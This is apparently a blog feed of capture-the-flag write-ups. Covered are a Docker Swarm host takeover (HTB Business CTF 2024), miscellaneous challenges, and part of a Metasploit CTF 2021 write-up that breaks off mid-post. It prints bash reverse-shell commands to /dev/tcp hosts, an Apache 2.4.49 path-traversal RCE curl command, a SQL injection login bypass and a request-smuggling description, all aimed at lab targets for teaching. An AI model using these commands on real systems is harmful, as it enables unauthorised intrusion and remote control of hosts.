&lt;p>With the target part of our swarm, we can create a docker service that will launch a container of our choosing on the nodes.&lt;/p>
&lt;p>During my research on how I can mount stuff in the docker container, I learnt that I can mount the docker socket of the server inside the container.&lt;/p>
&lt;p>My idea was to mount the docker socket into the container, then run another privileged docker container and get access to the host filesystem of our target server.&lt;/p>
&lt;p>The only problem I had was to get the docker binary into the container. To solve this I needed to get a container that contains wget/curl and to get a static docker binary. The static docker binary I could download from the link below.&lt;/p>
&lt;p>&lt;a href="https://download.docker.com/linux/static/stable/x86_64/" target="_blank" rel="noopener">https://download.docker.com/linux/static/stable/x86_64/&lt;/a>
&lt;/p>
&lt;p>For the docker container I could either build one or get one off of dockerhub, I chose to look for one and landed on this one below.&lt;/p>
&lt;p>&lt;a href="https://hub.docker.com/r/devorbitus/ubuntu-bash-jq-curl" target="_blank" rel="noopener">https://hub.docker.com/r/devorbitus/ubuntu-bash-jq-curl&lt;/a>
&lt;/p>
&lt;p>Now let&amp;rsquo;s get attacking:&lt;/p>
&lt;p>&lt;code>Step 1:&lt;/code> Push the container image to the target&amp;rsquo;s registry from our attacker machine.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker tag devorbitus/ubuntu-bash-jq-curl:latest swarm.htb:5000/ubuntu-bash-jq-curl:v1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker push swarm.htb:5000/ubuntu-bash-jq-curl:v1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Step 2:&lt;/code> Create the docker service to launch our container on the worker node (which is our target server) with the docker socket mounted inside, then get command execution inside the container.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker service create --constraint node.role&lt;span style="color:#f92672">==&lt;/span>worker --name pwn --mount type&lt;span style="color:#f92672">=&lt;/span>bind,source&lt;span style="color:#f92672">=&lt;/span>/var/run/docker.sock,target&lt;span style="color:#f92672">=&lt;/span>/var/run/docker.sock,ro swarm.htb:5000/ubuntu-bash-jq-curl:latest /bin/bash -c &lt;span style="color:#e6db74">&amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.95/8000 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_12.png" class="center" style="border-radius: 8px;" />
&lt;p>At this point we have command execution on the container running on the target.&lt;/p>
&lt;p>&lt;code>Step 3:&lt;/code> Download the docker static binary into the container, so we can interact with docker on the target server.&lt;/p>
&lt;p>I set up a python web server on my attacker machine, then used curl to download the docker binary on to the container.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_13.png" class="center" style="border-radius: 8px;" />
&lt;p>Now we confirm we can interact with docker on the target host.&lt;/p>
&lt;p>&lt;code>Step 4:&lt;/code> Run another container mounting the filesystem of the host into that container.&lt;/p>
&lt;p>We successfully mount the filesystem of the host into the new container and can read the root flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_14.png" class="center" style="border-radius: 8px;" />
&lt;p>root.txt: &lt;strong>HTB{5tunG_bY_th3_5w4rm}&lt;/strong>&lt;/p>
&lt;h3 id="post-ctf">Post CTF&lt;/h3>
&lt;p>After the CTF and other solutions were posted, I realized I could have just mounted the filesystem at the beginning and skip the whole process of creating multiple containers and having to download the docker binary.&lt;/p>
&lt;p>As you can see when creating the service, we set the source and destination to the filesystem of the host and container respectively.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>docker service create --constraint node.role&lt;span style="color:#f92672">==&lt;/span>worker --name pwn --mount type&lt;span style="color:#f92672">=&lt;/span>bind,source&lt;span style="color:#f92672">=&lt;/span>/,target&lt;span style="color:#f92672">=&lt;/span>/mnt,ro swarm.htb:5000/ubuntu-bash-jq-curl:latest /bin/bash -c &lt;span style="color:#e6db74">&amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.95/8000 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/fullpwn/full_pwn_swarm_15.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>Sorry for the long post, I had a good time working on the challenges and documenting all of it including the things I learn are part of my way of playing CTFs so I never forget.&lt;/p>
&lt;p>It seems the rating of the challenges was skewed towards experienced players as some of the easy ones took some time to complete, hats off to HTB for the CTF. Can&amp;rsquo;t wait to play the next one. The platform is really smooth to use.&lt;/p>
&lt;p>If you think I should have broken it up into individual posts for each challenge, let me know! You can reach me on twitter &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">@ikuamike&lt;/a>
&lt;/p>
&lt;p>Thanks for reading!&lt;/p></content></item><item><title>HTB Business CTF 2024 WriteUp - Misc</title><link>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc/</link><pubDate>Wed, 22 May 2024 00:25:15 +0300</pubDate><guid>https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>In this post, I&amp;rsquo;ll be covering solutions to the Misc Challenges from the &lt;a href="https://ctf.hackthebox.com/event/details/htb-business-ctf-2024-the-vault-of-hope-1474" target="_blank" rel="noopener">HTB Business CTF 2024&lt;/a>
.&lt;/p>
&lt;h3 id="1-hidden-path">1. Hidden Path&lt;/h3>
&lt;p>This challenge was rated &lt;strong>Easy&lt;/strong>. We are provided with files to download, allowing us to read the app&amp;rsquo;s source code.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/hidden_path_1.png" class="center" style="border-radius: 8px;" />
&lt;p>On reading the code, we see that the app accepts user input on the &lt;em>&lt;strong>/server_status&lt;/strong>&lt;/em> endpoint. It takes in &lt;em>&lt;strong>choice&lt;/strong>&lt;/em> parameter and something else.&lt;/p>
&lt;p>Initially I didn&amp;rsquo;t immediately pick this out but after looking closely, my code editor highlights that there is another parameter. Hovering my mouse over it revealed that it was the invisible unicode character U+3164. This character also appears to be also used in the array listing command choices that can be executed.&lt;/p>
&lt;p>What this means is that, we can supply a command to this character then select it as our command choice using the index in the array .&lt;/p>
&lt;p>I copied the unicode character from this &lt;a href="https://unicode-explorer.com/c/3164" target="_blank" rel="noopener">unicode-explorer&lt;/a>
link, then crafted my request as below in burp.ㅤ&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/hidden_path_2.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;strong>HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_2b06cb9b519dd72e472ccdadda3917ce}&lt;/strong>&lt;/p>
&lt;h3 id="2-locked-away">2. Locked Away&lt;/h3>
&lt;p>This challenge was also rated &lt;strong>Easy&lt;/strong>. Here we are also provided the code. For the challenge.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/locked_away_1.png" class="center" style="border-radius: 8px;" />
&lt;p>As seen, our input will be checked against a blacklist then passed to exec command.&lt;/p>
&lt;p>Since exec will execute any python code we supply, we can override the blacklist list by assigning it something different rendering it useless then read the flag by calling the openchest function.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>blacklist &lt;span style="color:#f92672">=&lt;/span> str(&lt;span style="color:#ae81ff">1&lt;/span>),str(&lt;span style="color:#ae81ff">2&lt;/span>),str(&lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also drop into a shell by import pty module.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/locked_away_2.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;strong>HTB{bYp4sSeD_tH3_fIlT3r5?_aLw4Ys_b3_c4RefUL!_ab204eba259a305414b338855f2fd91d}&lt;/strong>&lt;/p>
&lt;h3 id="3-zephyr">3. Zephyr&lt;/h3>
&lt;p>This challenge was rated &lt;strong>Medium&lt;/strong>. We are also provided with the challenge files.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_1.png" class="center" style="border-radius: 8px;" />
&lt;p>On the terminal, when we navigate to the folder, we note that this is a git repo with only two files. My terminal prompt also picks up the main branch.&lt;/p>
&lt;p>Let&amp;rsquo;s check the commit history on the main branch.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>git --no-pager log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_2.png" class="center" style="border-radius: 8px;" />
&lt;p>We only have 2 commits, lets view the modification using git diff.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>git --no-pager diff &lt;span style="color:#ae81ff">1501&lt;/span> ae4f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_4.png" class="center" style="border-radius: 8px;" />
&lt;p>We see that only the &lt;em>&lt;strong>database.db&lt;/strong>&lt;/em> file has been modified. Let&amp;rsquo;s checkout the initial commit to view what sensitive info was removed.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_3.png" class="center" style="border-radius: 8px;" />
&lt;p>From this initial commit, we get a piece of the flag: &lt;strong>_gOT_thE_DB_&lt;/strong>.&lt;/p>
&lt;p>Now let&amp;rsquo;s check if there are any other branches and switch to them.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_5.png" class="center" style="border-radius: 8px;" />
&lt;p>On the &lt;em>&lt;strong>w4rri0r-changes&lt;/strong>&lt;/em> branch, we see there is a new commit. We can use &lt;em>git log&lt;/em> again but with &lt;em>-p&lt;/em> option to view the changes.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>git --no-pager log -p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_6.png" class="center" style="border-radius: 8px;" />
&lt;p>We now have another piece of the flag: &lt;strong>HTB{g0t_tH3_p4s5&lt;/strong>.&lt;/p>
&lt;p>Finally, after some time going through the files trying to get the final piece. I discovered file changes in a git repo can also be stored in stash.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>git --no-pager stash show -p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/htb_business_ctf_2024/misc/zephyr_7.png" class="center" style="border-radius: 8px;" />
&lt;p>After checking the stash, we now have the final piece of the flag: &lt;strong>g0T_TH3_sT4sH}&lt;/strong>.&lt;/p>
&lt;p>Flag: &lt;strong>HTB{g0t_tH3_p4s5_gOT_thE_DB_g0T_TH3_sT4sH}&lt;/strong>&lt;/p></content></item><item><title>Metasploit Community CTF 2021 WriteUp</title><link>https://blog.ikuamike.io/posts/2021/metasploit_ctf_2021/</link><pubDate>Mon, 06 Dec 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/metasploit_ctf_2021/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ascii.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Similar to last year&amp;rsquo;s ctf we are provided with a kali machine as the jump box and an Ubuntu VM with ports open for the different challenges.&lt;/p>
&lt;p>As usual I participated with team @&lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
and we were able to solve 8 challenges and got position 47/265. This year
most of the challenges were tougher than last year as we solved less. It was a good experience nonetheless. You can read last year&amp;rsquo;s writeup &lt;a href="https://blog.ikuamike.io/posts/2020/metasploitctf2020/" target="_blank" rel="noopener">here&lt;/a>
if interested.&lt;/p>
&lt;p>In this writeup I&amp;rsquo;ll be explaining solutions of 5 challenges I was able to solve. To connect to the victim machine directly via the kali box, I used this sshuttle command.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sshuttle -r kali@54.89.123.4 -e &lt;span style="color:#e6db74">&amp;#34;ssh -i metasploit_ctf_kali_ssh_key.pem&amp;#34;&lt;/span> 172.17.6.181/32
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;h3 id="5-of-diamonds">5 of Diamonds&lt;/h3>
&lt;p>This challenge was on port 11111. When we load it on our browser we get the below app.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-20.png" class="center" style="border-radius: 8px;" />
&lt;p>For this one it was a simple sql injection login bypass. By supplying the username &lt;code>admin&lt;/code> and the password &lt;code>a' or 1=1-- -&lt;/code>
we can login and get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-21.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/5ofdiamonds.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="10-of-clubs">10 of Clubs&lt;/h3>
&lt;p>This challenge was on port 12380. From an nmap scan we get the below output.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-1.png" class="center" style="border-radius: 8px;" />
&lt;p>When we access the http server on the browser we just get a static page.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-2.png" class="center" style="border-radius: 8px;" />
&lt;p>The site didn&amp;rsquo;t have anything interesting about it. Looking at the Apache httpd version it looked familiar as I had seen some
advisories floating around for this version regarding a directory traveral vulnerability that could lead to RCE.&lt;/p>
&lt;p>Using the below PoC command I was able to confirm RCE.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --data &lt;span style="color:#e6db74">&amp;#34;echo;id&amp;#34;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;http://172.17.6.181:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-3.png" class="center" style="border-radius: 8px;" />
&lt;p>Then with the below command we can get a reverse shell on the kali vm.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --data &lt;span style="color:#e6db74">&amp;#34;echo;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.6.180/53 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#e6db74">&amp;#39;http://172.17.6.181:12380/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-4.png" class="center" style="border-radius: 8px;" />
&lt;p>With the reverse shell we can get the md5sum of the image to submit as our flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-5.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/10ofclubs.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Reference:&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>https://isc.sans.edu/forums/diary/Apache+2449+Directory+Traversal+Vulnerability+CVE202141773/27908/
&lt;/code>&lt;/pre>&lt;h3 id="2-of-clubs">2 of Clubs&lt;/h3>
&lt;p>This challenge was on port 20000 and 20001. When we visit port 20000 on our browser, we get the following:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-6.png" class="center" style="border-radius: 8px;" />
&lt;p>The &lt;code>/client&lt;/code> directory just has a file for us to download.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-7.png" class="center" style="border-radius: 8px;" />
&lt;p>After extraction we get some files and &lt;strong>clicktracer&lt;/strong> application that launches a GUI application.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-8.png" class="center" style="border-radius: 8px;" />
&lt;p>Since it&amp;rsquo;s connecting to localhost, I decided to use ssh port forwarding to forward the traffic to the victim.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -L 20001:172.17.6.181:20001 -i metasploit_ctf_kali_ssh_key.pem kali@54.89.123.4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Selecting the easy challenge, it appears to be a clicking game where we are supposed to click the red dots.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-9.png" class="center" style="border-radius: 8px;" />
&lt;p>When the time hits 30 seconds, we get our final score.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-10.png" class="center" style="border-radius: 8px;" />
&lt;p>Next step is to use wireshark and sniff the traffic to figure out the messages between the application and the server so as to automate the clicks and
get all of them.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-11.png" class="center" style="border-radius: 8px;" />
&lt;p>When we click on the Easy Practice button the messages are as follows.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-12.png" class="center" style="border-radius: 8px;" />
&lt;p>When we click on the Easy Challenge button the messages are as follows.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-13.png" class="center" style="border-radius: 8px;" />
&lt;p>With this information I was able to automate all clicks for the challenge using the below script and get the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>port &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">20001&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>io &lt;span style="color:#f92672">=&lt;/span> remote(host,port)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>init &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{&amp;#34;StartGame&amp;#34;:{&amp;#34;game_mode&amp;#34;:&amp;#34;Easy&amp;#34;}}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>io&lt;span style="color:#f92672">.&lt;/span>sendline(init&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">100&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recv()&lt;span style="color:#f92672">.&lt;/span>decode()&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;TargetHit&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> resp:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(resp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> &lt;span style="color:#e6db74">&amp;#34;GameEnded&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> resp:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(resp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(resp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(resp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> j[&lt;span style="color:#e6db74">&amp;#34;TargetCreated&amp;#34;&lt;/span>][&lt;span style="color:#e6db74">&amp;#34;x&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> y &lt;span style="color:#f92672">=&lt;/span> j[&lt;span style="color:#e6db74">&amp;#34;TargetCreated&amp;#34;&lt;/span>][&lt;span style="color:#e6db74">&amp;#34;y&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> click &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{&amp;#34;ClientClick&amp;#34;:{&amp;#34;x&amp;#34;:&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span> str(x) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;,&amp;#34;y&amp;#34;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(y) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;}}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> io&lt;span style="color:#f92672">.&lt;/span>sendline(click&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>When the script runs to completion we get the location of the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-14.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/2ofclubs.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="ace-of-hearts">Ace of Hearts&lt;/h3>
&lt;p>This challenge was on port 20011. When we load it on the browser we get this app.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-15.png" class="center" style="border-radius: 8px;" />
&lt;p>When we try to access each of the provided we can load them except for John which is restricted.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-16.png" class="center" style="border-radius: 8px;" />
&lt;p>The other interesting feature is the form. When I submit a test input the application tries to load it as url.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-17.png" class="center" style="border-radius: 8px;" />
&lt;p>Since we have an admin url that is also restricted, we can try to load it but specify the host as localhost as the below url.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>http://172.17.6.181:20011/gallery?galleryUrl&lt;span style="color:#f92672">=&lt;/span>http://127.0.0.1:20011/admin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-18.png" class="center" style="border-radius: 8px;" />
&lt;p>From this we can see that John&amp;rsquo;s gallery is set to private. We can uncheck this and then access John&amp;rsquo;s gallery.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-19.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/aceofhearts.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="3-of-hearts">3 of Hearts&lt;/h3>
&lt;p>This challenge was on port 33337. From nmap we get the following output.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-22.png" class="center" style="border-radius: 8px;" />
&lt;p>When we try to load it on the browser it redirects to the domain threeofhearts.ctf.net. To sort this out I decided to add a match and replace
rule in burpsuite as below that sets the correct host header.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-23.png" class="center" style="border-radius: 8px;" />
&lt;p>Now we can access the application.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-24.png" class="center" style="border-radius: 8px;" />
&lt;p>The private page just shows access denied.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-25.png" class="center" style="border-radius: 8px;" />
&lt;p>The logs page is empty but once we submit anything on the form, for example &lt;code>a,a&lt;/code> it gets saved to save.txt together with 2 headers.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-26.png" class="center" style="border-radius: 8px;" />
&lt;p>If we look at our burp history we see that the page responds with Nginx Save Page.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-28.png" class="center" style="border-radius: 8px;" />
&lt;p>This means that the backend server is Nginx and frontend is the ATS server.&lt;/p>
&lt;p>After some research I discovered that Apache Traffic Server 7.1.1 is vulnerable to http request smuggling.&lt;/p>
&lt;p>In this case the issue is CL.TE.&lt;/p>
&lt;p>Explanation from &lt;a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling&lt;/a>
.&lt;/p>
&lt;blockquote>
&lt;p>CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.&lt;/p>
&lt;/blockquote>
&lt;p>By sending the below request in burp, the ATS server uses Content-Length header and forwards the full request to the backend
nginx server which uses Transfer-Encoding header.&lt;/p>
&lt;p>Nginx will then split the request into 2 whereby it takes &lt;code>G&lt;/code> as the beginning of the next request. The result of this is that
any follow up requests will fail because the added &lt;code>G&lt;/code> will create an HTTP method that doesn&amp;rsquo;t exist. Say the follow up request is a GET
request the resulting method will be GGET.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-29.png" class="center" style="border-radius: 8px;" />
